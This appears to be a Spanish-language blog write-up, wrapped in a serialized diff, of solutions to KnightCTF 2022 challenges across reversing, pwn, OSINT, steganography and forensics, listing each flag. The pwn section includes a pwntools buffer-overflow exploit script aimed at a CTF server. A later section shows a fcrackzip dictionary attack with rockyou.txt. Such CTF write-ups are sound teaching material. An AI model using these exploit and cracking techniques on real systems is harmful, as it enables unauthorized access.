@@ -1,0 +1,307 @@
+I"if<p>KnightCTF 2022, es el primer <em>capture de flag</em> organizado por <a href="https://knightsquad.org/">Knight Squad</a>, este es de tipo <em>jeopardy</em>, por lo que encontraremos distintas categorias.</p>
+
+<div style="text-align:center">
+  <img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/1.png" />
+</div>
+
+<h3 id="reverse-engineering"><a href="#header-3"></a>Reverse Engineering</h3>
+
+<h4 id="the-encoder"><a href="#header-4"></a>The Encoder</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/2.png" alt="" /></p>
+
+<p>Al extraer y ejecutar el binario, <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/the_encoder.zip">the_encoder.out</a>, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier caracter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/3.png" alt="" /></p>
+
+<p>Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros.</p>
+
+<p>Podemos consultar una <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/4.png">tabla de código ASCII</a>, para saber en que orden van los caracteres, y así simplificar las cosas.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/5.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{s1Mpl3_3Nc0D3r_1337}
+</code></pre></div></div>
+
+<h3 id="pwn"><a href="#header-3"></a>PWN</h3>
+
+<h4 id="whats-your-name"><a href="#header-4"></a>What’s Your Name</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/6.png" alt="" /></p>
+
+<p>Al extraer y ejecutar el binario, <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/whats_your_name.zip">whats_your_name</a>, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/7.png" alt="" /></p>
+
+<p>Si introducimos una cadena de caracteres lo suficientemente larga, conseguiremos un <code class="language-plaintext highlighter-rouge">Segmentation Fault</code>, lo cual nos da la idea de un posible <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/8.png" alt="" /></p>
+
+<p>Podemos empezar a depurar el binario con <code class="language-plaintext highlighter-rouge">GEF</code>, tal y como lo hicimos en la máquina <a href="https://mateonitro550.github.io/Safe-Hack-The-Box">Safe</a> de <em>Hack The Box</em>, y nos daremos cuenta que el <em>buffer</em> tiene una longitud de <em>72 bytes</em>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/9.png" alt="" /></p>
+
+<p>Ya con esto en mente, podemos analizar el binario con <code class="language-plaintext highlighter-rouge">Ghidra</code>, y nos daremos cuenta que dentro de la función <code class="language-plaintext highlighter-rouge">main</code>, después de hacer una serie de validaciones, se está efectuando una llamada al sistema para ejecutar un <code class="language-plaintext highlighter-rouge">cat</code> al archivo <code class="language-plaintext highlighter-rouge">/home/hacker/flag.txt</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/10.png" alt="" /></p>
+
+<p>De modo que teniendo control sobre el registro <code class="language-plaintext highlighter-rouge">RIP</code>, si apuntamos a la dirección de la llamada al sistema, omitiremos toda la validación y conseguiremos listar la flag; para ello, haremos un script en <code class="language-plaintext highlighter-rouge">Python</code>, bastante parecido al de la máquina <a href="https://mateonitro550.github.io/Safe-Hack-The-Box">Safe</a> de <em>Hack The Box</em>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">]</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"198.211.115.81"</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011d3</span><span class="p">)</span>
+
+<span class="n">junk</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{bAbY_bUfF3r_0v3Rf1Ow}
+</code></pre></div></div>
+
+<h3 id="osint"><a href="#header-3"></a>OSINT</h3>
+
+<h4 id="canada-server"><a href="#header-4"></a>Canada Server</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/11.png" alt="" /></p>
+
+<p>Este reto es bastante simple, solamente teníamos que hacer una pequeña búsqueda en internet.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/12.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{192.99.167.83}
+</code></pre></div></div>
+
+<h4 id="find-the-camera"><a href="#header-4"></a>Find The Camera</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/13.png" alt="" /></p>
+
+<p>Una vez descargamos el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/Bus.png">archivo adjunto</a>, vamos a darnos cuenta que los derechos de autor le pertenecen a <code class="language-plaintext highlighter-rouge">JenCh012</code>, así que procedemos a buscarlo.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/14.png" alt="" /></p>
+
+<p>Vemos que a parte de algunas páginas rusas, nuestra búsqueda guarda relación con autobuses, por lo que estamos en el lugar correcto, entraremos en el primer resultado.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/15.png" alt="" /></p>
+
+<p>Podemos observar que hay una sección en la que podemos introducir la matrícula del autobús, y posteriormente, nos arrojará un resultado.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/16.png" alt="" /></p>
+
+<p>Ambas fotografías curiosamente pertenecen al usuario <code class="language-plaintext highlighter-rouge">JenCh012</code>, por lo que haremos click en la fotografía que nos interesa.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/17.png" alt="" /></p>
+
+<p>Ya con esto habríamos conseguido el modelo de la cámara, ahora solamente haría falta saber a que marca pertenece.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{SONY_DSC_S&amp;980}
+</code></pre></div></div>
+
+<h3 id="steganography"><a href="#header-3"></a>Steganography</h3>
+
+<h4 id="follow-the-white-rabbit"><a href="#header-4"></a>Follow The White Rabbit</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/18.png" alt="" /></p>
+
+<p>Una vez descargado el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/whiterabbit.jpg">archivo adjunto</a>, podemos darnos cuenta que existe una serie de puntos y líneas, por lo que podemos intuir que estamos frente a <code class="language-plaintext highlighter-rouge">código morse</code>. Para ello, podemos usar herramientas como <a href="https://www.dcode.fr/codigo-morse">dcode</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{L0OKB4Y0UL34P}
+</code></pre></div></div>
+
+<h4 id="follow"><a href="#header-4"></a>Follow</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/19.png" alt="" /></p>
+
+<p>Cuando empezamos a analizar el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/Follow.pdf">archivo PDF</a> adjunto, rápidamente nos daremos cuenta que existe un espacio en blanco demasiado grande. Por lo que si marcamos el espacio en blanco, nos daremos cuenta que hay algo ahí.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/20.png" alt="" /></p>
+
+<p>De modo que copiaremos y pegaremos el texto en otro lado, revelando así la flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{This_is_the_real_flag}
+</code></pre></div></div>
+
+<h4 id="qr-code-from-the-future"><a href="#header-4"></a>QR Code From The Future</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/21.png" alt="" /></p>
+
+<p>Al abrir el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/QR_Code_From_The_Future.gif">archivo adjunto</a>, nos daremos cuenta que estamos frente a una sucesión de códigos QR que cambia bastante rápido, por lo que, lo primero que haremos será identificar cada uno de los <em>frames</em> que componen este <em>GIF</em>, para ello podemos hacer uso de <a href="https://ezgif.com/split">Ezgif</a>.</p>
+
+<p>Una vez hemos conseguido los <em>48 códigos QR</em> que componen el <em>GIF</em>, pasaremos a decodificar cada uno de ellos; para agilizar el proceso haremos uso de <code class="language-plaintext highlighter-rouge">zbarimg</code>, por lo que deberemos de tener descargados todos los <em>códigos QR</em>. En caso de no contar con la herramienta descargada podemos hacer lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install zbar-tools
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zbarimg * | cut -d ":" -f2 | tr -d "\n"
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/22.png" alt="" /></p>
+
+<p>Una vez escaneados los <em>48 código QR</em> conseguiremos la siguiente cadena de caracteres:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>}pvznalq_bg_pvgngf_zbes_qriybir_gbt_rqbp_ED{SGPX
+</code></pre></div></div>
+
+<p>Ligeramente podemos empezar a ver el formato de la flag, de modo que la cadena que acabamos de conseguir está al revés.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zbarimg * | cut -d ":" -f2 | tac | tr -d "\n"
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/23.png" alt="" /></p>
+
+<p>La cadena, está encriptada por <code class="language-plaintext highlighter-rouge">ROT13</code>, por lo que al <a href="https://rot13.com/">decodificarla</a>, conseguiremos la flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{QR_code_got_evolved_from_static_to_dynamic}
+</code></pre></div></div>
+
+<h3 id="misc"><a href="#header-3"></a>Misc</h3>
+
+<h4 id="unzip-me"><a href="#header-4"></a>Unzip Me</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/24.png" alt="" /></p>
+
+<p>Al descomprimir el archivo <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/unzipme.tar.gz">unzipme.tar.gz</a>, extraeremos un archivo que lleva por nombre <code class="language-plaintext highlighter-rouge">unzipme</code>.</p>
+
+<p>El propio nombre del archivo nos sugiere que debemos de descomprimirlo, sin embargo, no conocemos en que formato está comprimido; podríamos hacer uso del comando <code class="language-plaintext highlighter-rouge">file</code>, sin embargo nos dirá que simplemente se trata de <em>data</em>.</p>
+
+<p>Como no conocemos el formato del archivo, podríamos visualizar su contenido en <em>hexadecimal</em> haciendo uso de <code class="language-plaintext highlighter-rouge">xxd</code>, para así conseguir su <code class="language-plaintext highlighter-rouge">magic number</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xxd unzipme
+</code></pre></div></div>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/25.png" alt="" /></p>
+
+<p>Si nos percatamos, cada pareja de dígitos está dada la vuelta; es decir, la forma correcta de los cuatro primeros dígitos debería ser <code class="language-plaintext highlighter-rouge">504B 0304</code>, esto corresponde con el <code class="language-plaintext highlighter-rouge">magic number</code> de los archivos <code class="language-plaintext highlighter-rouge">PKZip</code>. Tenemos una lista completa de <em>magic numbers</em>, de varios tipos de archivos, <a href="https://asecuritysite.com/forensics/magic">aquí</a>.</p>
+
+<p>De este modo, haciendo uso de <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, podemos descomprimir el archivo <code class="language-plaintext highlighter-rouge">unzipme</code>. Lo primero que haremos será indicar que queremos trabajar con el formato <code class="language-plaintext highlighter-rouge">hexdump</code>, y posterior a ello introduciremos el output conseguido con el comando <code class="language-plaintext highlighter-rouge">xxd</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/26.png" alt="" /></p>
+
+<p>Luego de esto, indicaremos que queremos cambiar el <code class="language-plaintext highlighter-rouge">endianness</code> cada <em>2 bytes</em>, para finalmente descomprimir el archivo <code class="language-plaintext highlighter-rouge">unzipme</code> y conseguir la flag.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/27.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{sO_yOu_sWaPP3D_tHe_f1L3}
+</code></pre></div></div>
+
+<h4 id="look-closely"><a href="#header-4"></a>Look Closely</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/28.png" alt="" /></p>
+
+<p>Para este reto se nos da un archivo <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/look%20closely.wav">.wav</a>, del cual no logramos identificar nada. Lo que podemos hacer es visualizar el espectrograma con herramientas como <code class="language-plaintext highlighter-rouge">Audacity</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install audacity
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/29.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://drive.google.com/file/d/1_6c_waS9ijouTpqI_tUO6VCRf7fE6gCY/view?usp=sharing
+</code></pre></div></div>
+
+<p>En el enlace encontraremos un video que aparte de verse fatal, contiene dos cadenas de caracteres escritas en binario.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/30.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01001011 01000011 01010100 01000110 01111011 01001000 00110011
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/31.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01001100 01001100 01001111 01011111 01001010 00110011 01001100 01001100 01001111 01111101 
+</code></pre></div></div>
+
+<p>Una vez las unimos, y <a href="https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)">traducimos</a> obtenemos la flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{H3LLO_J3LLO}
+</code></pre></div></div>
+
+<h3 id="digital-forensics"><a href="#header-3"></a>Digital Forensics</h3>
+
+<h4 id="the-lost-flag"><a href="#header-4"></a>The Lost Flag</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/32.png" alt="" /></p>
+
+<p>A la hora de abrir el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/Lost%20Flag%20.png">archivo adjunto</a> no vamos a encontrar nada sospechoso a primera vista.</p>
+
+<p>No obstante, si utilizamos herramientas como <code class="language-plaintext highlighter-rouge">StegSolve</code>, vamos a poder visualizar la flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
+chmod +x stegsolve.jar
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/33.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{Y0U_F0UND_M3}
+</code></pre></div></div>
+
+<h4 id="unknown-file"><a href="#header-4"></a>Unknown File</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/34.png" alt="" /></p>
+
+<p>Al descomprimir el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/unknown file.zip">archivo adjunto</a>, extraeremos un archivo que lleva por nombre <code class="language-plaintext highlighter-rouge">unknown file</code>.</p>
+
+<p>Así como el enunciado sugiere, no se sabe ante que tipo de archivo nos estamos enfrentando, por lo que comandos como <code class="language-plaintext highlighter-rouge">file</code>, no nos serán de utilidad. Lo que podemos hacer es visualizar el contenido del archivo en <em>hexadecimal</em> haciendo uso de <code class="language-plaintext highlighter-rouge">xxd</code>, para así conseguir su <code class="language-plaintext highlighter-rouge">magic number</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xxd unknown\ file | head
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/35.png" alt="" /></p>
+
+<p>Si nos percatamos, el <code class="language-plaintext highlighter-rouge">magic number</code> no corresponde con ninguno conocido, sin embargo, podemos observar una sección que dice <code class="language-plaintext highlighter-rouge">IHDR</code>, el cual corresponde con uno de los <em>chunks</em> principales de cualquier imagen <code class="language-plaintext highlighter-rouge">PNG</code>.</p>
+
+<p>De modo que reemplazando los cuatro primeros dígitos con <code class="language-plaintext highlighter-rouge">89 50 4E 47</code>, conseguiremos visualizar la flag, esto podemos hacerlo mediante herramientas online como <a href="https://www.onlinehexeditor.com/">Online Hex Editor</a>, o <code class="language-plaintext highlighter-rouge">ghex</code>, que para instalarlo es bastante sencillo.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install ghex
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/36.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{Imag3_H3ad3r_M4nipul4t10N}
+</code></pre></div></div>
+
+<h4 id="lets-walk-together"><a href="#header-4"></a>Let’s Walk Together</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/37.png" alt="" /></p>
+
+<p>Al abrir el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/interesting_waves.png">archivo adjunto</a> no vamos a observar nada relevante, no obstante, el nombre del reto nos da una pista bastante importante.</p>
+
+<p>Vamos a hacer uso de <code class="language-plaintext highlighter-rouge">binwalk</code>, una herramienta de <em>ingeniería inversa</em> dedicada a identificar archivos y código malicioso en <em>imágenes de firmware</em>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>binwalk -e interesting_waves.png
+</code></pre></div></div>
+
+<p>Se nos creará una carpeta dentro de la cual estará todo lo que se encontraba dentro de la imagen; entre ello, un archizo <code class="language-plaintext highlighter-rouge">.zip</code> protegido por contraseña.</p>
+
+<p>En vista de que no tenemos ningún indicio de ninguna contraseña, aplicaremos fuerza bruta sobre el archivo <code class="language-plaintext highlighter-rouge">.zip</code> mediante <code class="language-plaintext highlighter-rouge">fcrackzip</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install fcrackzip
+</code></pre></div></div>
+
+<p>Para ello necesitaremos de algún diccionario, el más común es <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20220209T031834Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;X-Amz-SignedHeaders=host&amp;actor_id=79855501&amp;key_id=0&amp;repo_id=97553311&amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;response-content-type=application%2Foctet-stream">rockyou.txt</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fcrackzip -D -p /dirección/del/diccionario/rockyou.txt -u 11150.zip
+</code></pre></div></div>
+
+<ul>
+  <li>D - Indicamos que queremos hacer un <code class="language-plaintext highlighter-rouge">ataque de diccionario</code></li>
+  <li>p - Indicamos el diccionario</li>
+  <li>u - Nos quedamos solamente con la contraseña correcta; descartamos falsos positivos</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/38.png" alt="" /></p>
+
+<p>Ya con la contraseña del <code class="language-plaintext highlighter-rouge">.zip</code>, podemos extraer el archivo <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{BiNw4lk_is_h3lpfUl}
+</code></pre></div></div>
+
+:ET
